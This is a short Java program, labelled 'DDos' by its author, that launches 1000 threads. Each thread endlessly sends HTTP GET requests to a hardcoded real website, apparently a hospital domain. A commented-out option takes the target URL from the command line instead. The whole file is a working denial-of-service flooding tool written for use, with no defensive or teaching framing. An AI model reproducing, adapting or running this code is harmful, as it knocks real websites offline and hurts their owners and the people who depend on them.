package pack;


import java.io.IOException;

import org.apache.http.HttpEntity;
import org.apache.http.ParseException;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

/**
 * @author china-libai
 * DDos
 * CMD中：C:\Users\Administrator\Desktop>java -jar doD.jar http://www.baidu.com
 */
public class doHttpClient {

	/**
	 * @param args[0] 要D的地址
	 */
	public static void main(String[] args) {
		Runnable r = new Runnable() {
            public void run() {
                while(true) {
                	get("http://www.lsrmyy.cn/");
//                    get(args[0]);
                }
            }
        };
        for(int i=0;i<1000;i++){
        	Thread mythread = new Thread(r);
        	mythread.start();
        }
	}
	
	 public static void get(String url) {  
	        CloseableHttpClient httpclient = HttpClients.createDefault();  
	        try {  
	            HttpGet httpget = new HttpGet(url);  
	            System.out.println("executing request " + httpget.getURI());  
	            CloseableHttpResponse response = httpclient.execute(httpget);  
	            try {  
	                HttpEntity entity = response.getEntity();  
	                System.out.println(response.getStatusLine());  
	                if (entity != null) {  
//	                    System.out.println("Response content length: " + entity.getContentLength());  
//	                    System.out.println("Response content: " + EntityUtils.toString(entity));  
	                }  
	            } finally {  
	                response.close();  
	            }  
	        } catch (ClientProtocolException e) {  
	            e.printStackTrace();  
	        } catch (ParseException e) {  
	            e.printStackTrace();  
	        } catch (IOException e) {  
	            e.printStackTrace();  
	        } finally {  
	            try {  
	                httpclient.close();  
	            } catch (IOException e) {  
	                e.printStackTrace();  
	            }  
	        }  
	    }  
}
